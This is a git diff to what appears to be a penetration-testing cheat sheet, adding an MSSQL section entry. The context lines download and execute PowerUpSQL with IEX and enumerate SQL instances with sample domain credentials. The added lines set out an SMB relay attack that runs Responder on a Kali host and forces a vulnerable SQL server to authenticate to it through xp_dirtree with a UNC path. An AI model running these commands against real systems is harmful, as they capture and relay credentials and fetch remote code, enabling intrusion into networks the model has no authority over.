@@ -249,6 +249,9 @@ MSSQL
   `IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1')`  
   `$Targets = Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10 -username "domain\user" -password "passw0rd123" | Where-Object {$_.Status -like "Accessible"}`  
 `Invoke-SQLAudit -Verbose -Instance "servername.domain.local,1433"`  
+  SMB Relay through xp_dirtree:  
+  Run responder on kali with `/opt/Responder/Responder.py -I eth0 -w -r -f -d`   
+  Initiate connection on xp_dirtree vulnerable sql server: `Get-SQLQuery -Verbose -Instance "servername.domain.local,1433" -Query "EXEC master.sys.xp_dirtree '\\<kali-ip>\test123'"   
   
 MySQL 
 - Enumerate tables:  
